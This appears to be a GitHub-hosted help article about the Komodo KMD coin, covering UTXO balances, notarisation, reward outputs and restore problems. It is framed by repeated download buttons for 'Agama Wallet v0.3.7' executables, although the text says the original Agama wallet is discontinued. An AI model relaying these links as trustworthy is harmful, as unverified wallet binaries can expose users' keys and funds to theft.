[![Agama Wallet](assets/banner-article.png)](https://github.com/agama-wallet/agama-desktop-wallet)

# KMD Coin: What Komodo's Native Asset Does

<div align="center">

<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7"><img src="https://img.shields.io/badge/RELEASE-v0.3.7-F47B20?style=for-the-badge&amp;labelColor=293D52" alt="Agama Wallet v0.3.7"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/blob/main/LICENSE"><img src="https://img.shields.io/badge/LICENSE-MIT-F47B20?style=for-the-badge&amp;labelColor=293D52" alt="MIT licence"></a>

</div>

<div align="center">

| Platform | File |
|---|---|
| <img src="https://img.shields.io/badge/WINDOWS-293D52?style=flat-square&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Windows" height="24"> | [`agamawallet-v.0.3.7.exe`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe) |
| <img src="https://img.shields.io/badge/MACOS-293D52?style=flat-square&amp;logo=apple&amp;logoColor=white" alt="Macos" height="24"> | [`agamawallet-v.0.3.7.dmg`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg) |
| <img src="https://img.shields.io/badge/LINUX-293D52?style=flat-square&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | [`agamawallet-v.0.3.7.zip`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip) |

</div>
All versions and checksums are on the [Agama Wallet release page](https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7).

> Only download from this GitHub release page.

---

KMD is the native coin of the Komodo blockchain, a UTXO chain that notarises its blocks onto Bitcoin through delayed proof of work. It pays fees, it is the base asset for Komodo's asset chains, and it is one of the assets Agama Wallet lists as supported, alongside BTC, LTC, ZEC, DOGE, BCH, DASH, VRSC and others.

## You'll see this if

A balance in KMD does not match what you expected after a reward, an interest payment or a restore, or you are trying to work out whether KMD is a token on another chain or a chain of its own.

| Question you have | Short answer |
|---|---|
| Is KMD a token? | No, it is the native coin of its own chain |
| How is a KMD balance stored? | As unspent outputs, like Bitcoin |
| Why did a small amount arrive separately? | Rewards and change arrive as their own outputs |
| Why is a restored KMD balance short? | Derivation or address range, not lost coins |
| Does KMD need an account? | No, the wallet holds keys locally |

## Why it happens

Komodo's chain is UTXO-based, so KMD behaves like BTC in the details that surprise people: a payment consumes outputs, change comes back to a fresh address, and a balance is a sum rather than a stored number.

Three Komodo-specific facts sit on top of that.

- **Notarisation.** Delayed proof of work has notary nodes record Komodo block hashes onto Bitcoin, which the project presents as protection against reorganisation and majority attacks on the Komodo chain. [Komodo dPoW](https://github.com/agama-wallet/agama-wallet/blob/main/delayed-proof-of-work.md) covers the mechanism.
- **Asset chains.** Komodo supports independent chains alongside the main chain, and KMD is the base asset those chains build around. [What Komodo is](https://github.com/agama-wallet/agama-wallet/blob/main/komodo-in-one-page.md) puts the pieces together.
- **Reward outputs.** Earlier Komodo reward and interest mechanics could deliver value to addresses the wallet controlled, including change addresses, as separate small outputs. That is ordinary UTXO behaviour, and it is also why an old install can show a scatter of small amounts.

The wallet's own asset list is the source for what it supports; the "30+" figure is the maker's count, not an independently verified inventory.

## Fix

Nothing is broken when KMD arrives as several outputs. What needs attention is a balance that does not reconcile after a restore.

1. **Check the address range.** A restored wallet derives addresses in sequence; a wallet that stops early will not see outputs beyond the range it scanned.
2. **Check the mode.** SPV mode queries remote servers and Native mode validates locally; an incomplete sync in either mode leaves outputs invisible.
3. **Check for pending change.** A spend that has not confirmed shows as outgoing before the change returns.
4. **Check the address, not just the total.** Outputs to an address the wallet did not derive are the classic "missing balance" case.
5. **Do not sweep anything until the balance reconciles.** Moving value from a wallet that is still scanning risks duplicating a spend.

If the outputs are visible on a block explorer but not in the wallet, the gap is derivation or sync. If they are not visible on the explorer either, the transaction never confirmed and no wallet setting changes that.

## If that did not work

If a restored wallet shows a fraction of the expected KMD, the usual cause is the address range rather than a partial phrase. Wallets that restore only the first N addresses miss outputs beyond N, and older wallets used different derivation defaults.

Users have also reported Komodo interest arriving at a change address that a seed restore did not reproduce, leaving the amount visible in history but not spendable from the restored wallet. That is a documented user report rather than a confirmed defect, and it is not a reason to expect recovery by any particular method.

If an old install will not start at all, the software is the problem, not the coin: the original wallet is discontinued and its own repository says it is not for use. [Moving KMD out of an old Agama wallet](https://github.com/agama-wallet/agama-wallet/blob/main/move-kmd-out-safely.md) is the migration path.

## Prevention

- **Record the addresses you use.** An address list is the fastest way to check a restore later.
- **Keep the phrase and the wallet file.** They cover different things; [backing up an Agama wallet](https://github.com/agama-wallet/agama-wallet/blob/main/backup-what-dat-covers.md) explains the difference.
- **Do not consolidate reward outputs casually.** They are small and merging them links them permanently.
- **Re-check after every restore.** A wallet that shows the right total today can still be scanning the wrong range tomorrow, and the gap only shows when you try to spend it.
- **Treat reward amounts as outputs, not as a balance.** The distinction explains most of the odd numbers, including why two wallets holding the same phrase can disagree on the total until both finish scanning.

## FAQ

### Is KMD mined?

Komodo's chain has historically used proof of work alongside notarisation. What matters for a wallet user is that KMD arrives as outputs and is spent as outputs, not how the block was produced.

### Why does my KMD balance show more than I sent myself?

Because the balance is the sum of every unspent output the wallet can see, including change and any reward outputs. A wallet does not show "what you sent" as a separate figure.

### Can I hold KMD without Komodo's wallet?

Yes. KMD is supported by other wallets and by Agama Wallet among others; what matters is that the wallet derives the right addresses from your recovery material, or the balance will not appear.

### Does KMD use the same address format as Bitcoin?

No, Komodo has its own address format, though the accounting model is the same. Addresses are not interchangeable between chains even when the model matches.

---

## Download Agama Wallet v0.3.7

<div align="center">

<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Download Agama Wallet for Windows"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=apple&amp;logoColor=white" alt="Download Agama Wallet for Macos"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=linux&amp;logoColor=white" alt="Download Agama Wallet for Linux"></a>

</div>

<div align="center">

| Platform | File |
|---|---|
| <img src="https://img.shields.io/badge/WINDOWS-293D52?style=flat-square&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Windows" height="24"> | [`agamawallet-v.0.3.7.exe`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe) |
| <img src="https://img.shields.io/badge/MACOS-293D52?style=flat-square&amp;logo=apple&amp;logoColor=white" alt="Macos" height="24"> | [`agamawallet-v.0.3.7.dmg`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg) |
| <img src="https://img.shields.io/badge/LINUX-293D52?style=flat-square&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | [`agamawallet-v.0.3.7.zip`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip) |

</div>
All versions and checksums are on the [Agama Wallet release page](https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7).

> Only download from this GitHub release page, and compare each file with the value printed there.

## Related guides

- [What Is Komodo? The Chain Behind KMD](https://github.com/agama-wallet/agama-wallet/blob/main/komodo-in-one-page.md)
- [Komodo dPoW: Notarising One Chain to Another](https://github.com/agama-wallet/agama-wallet/blob/main/delayed-proof-of-work.md)
- [Komodo Wallet: What It Is and How KMD Works](https://github.com/agama-wallet/agama-wallet/blob/main/komodo-and-kmd.md)
- [Moving KMD Out of an Old Agama Wallet](https://github.com/agama-wallet/agama-wallet/blob/main/move-kmd-out-safely.md)
